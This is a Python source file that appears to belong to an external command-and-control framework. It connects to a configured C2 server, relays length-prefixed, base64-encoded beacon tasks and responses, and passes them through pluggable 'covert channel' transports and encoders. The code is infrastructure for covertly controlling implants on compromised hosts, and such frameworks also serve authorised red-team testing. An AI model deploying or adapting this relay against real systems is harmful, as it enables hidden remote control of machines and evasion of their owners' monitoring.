import socket
import struct
import config
import base64
from ast import literal_eval


def importModule(modName, modType):
	"""
	Imports a passed module as either an 'encoder' or a 'transport'; called with either encoder.X() or transport.X()
	"""
	prep_global = "global " + modType
	exec(prep_global)
	importName = "import utils." + modType + "s." + modName + " as " + modType
	exec(importName, globals())

def createSocket():
	# Borrowed from https://github.com/outflanknl/external_c2/blob/master/python_c2ex.py
	d = {}
	d['sock'] = socket.create_connection((config.EXTERNAL_C2_ADDR, int(config.EXTERNAL_C2_PORT)))
	d['state'] = 1
	return (d['sock'])

def sendFrameToC2(sock, chunk):
	slen = struct.pack('<I', len(chunk))
	sock.sendall(slen + chunk)

def recvFrameFromC2(sock):
	try:
		chunk = sock.recv(4)
	except:
		return("")
	if len(chunk) < 4:
		return()
	slen = struct.unpack('<I', chunk)[0]
	chunk = sock.recv(slen)
	while len(chunk) < slen:
		chunk = chunk + sock.recv(slen - len(chunk))
	return(chunk)

def killSocket(sock):
	sock.close()

def task_encode(task):
	return base64.b64encode(task)

def task_decode(task):
	return base64.b64decode(task)

def prepData(data):
	# This will prepare whatever data is given based on the config
	rdyData = encoder.encode(data)
	return rdyData

def decodeData(data):
	# This will decode whatever data is given based on the config
	rdyData = encoder.decode(data)
	return rdyData

def retrieveData(beacon_id):
	# This will retireve data via the covert channel
	# Returns unencoded data

	# Transport should only retrieve responses for this specific beacon_id
	# If transport doesn't need it, it should still accept it regardless
	data = transport.retrieveData(beacon_id)
	if config.debug:
		print (color("RAW RETRIEVED DATA: ", status=False, yellow=True) + "%s") % (data)
	# Prepare the recieved data by running it through the decoder, returns the data frame as a string
	preped_data = decodeData(data)
	# Convert data frame to list
	decoded_data_frame = literal_eval(task_decode(preped_data))
	# Decode encoded data field
	data_frame = [decoded_data_frame[0], task_decode(decoded_data_frame[1])]
	return data_frame

def sendData(task_frame):
	# This will upload the data via the covert channel
	# returns a confirmation that the data has been sent
	beacon_id = task_frame[0]
	if config.debug:
		print (color("RAW DATA TO BE SENT: ", status=False, yellow=True) + "%s") % (task_frame)
	# Prepares the data to be sent via the covert channel
	new_task_frame = str([beacon_id, task_encode(task_frame[1])])
	encoded_task_frame = task_encode((new_task_frame))
	preped_data = prepData(encoded_task_frame)
	transport.sendData(beacon_id, preped_data)

def get_new_clients():
	new_client = transport.check_for_new_clients()
	if new_client is not None:
		# Decode encoded data
		decoded_new_client = decodeData(new_client)
		if config.debug:
			print (color("DECODED NEW CLIENT DATA RECVD: ", status=False, yellow=True) + "%s") % (decoded_new_client)
		# Convert data to data model and notify user
		print decoded_new_client
		prepped_new_client = literal_eval(task_decode(decoded_new_client))
		decoded_prepped_new_client = [prepped_new_client[0], literal_eval(task_decode(prepped_new_client[1]))]
		if config.debug:
			print (color("DECODED NEW CLIENT DATA RECVD: ", status=False, yellow=True) + "%s") % (decoded_prepped_new_client)
		print (color("NEW CLIENT RECIEVED: {}").format(decoded_prepped_new_client[0]))
		return decoded_prepped_new_client
	else:
		# if no new client, return 0
		return 0


def color(string, status=True, warning=False, bold=True, yellow=False):
	"""
	Change text color for the terminal, defaults to green

	Set "warning=True" for red
	"""

	attr = []

	if status:
		# green
		attr.append('32')
	if warning:
		# red
		attr.append('31')
	if bold:
		attr.append('1')
	if yellow:
		attr.append('33')
	return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

# TODO: add a function that handles logic for when a session exits to notify the c2 controller. Right now, this could/would only ever by killing the socket.
#       if the spec ever changes to support restoration for sessions, then this can become a priority.
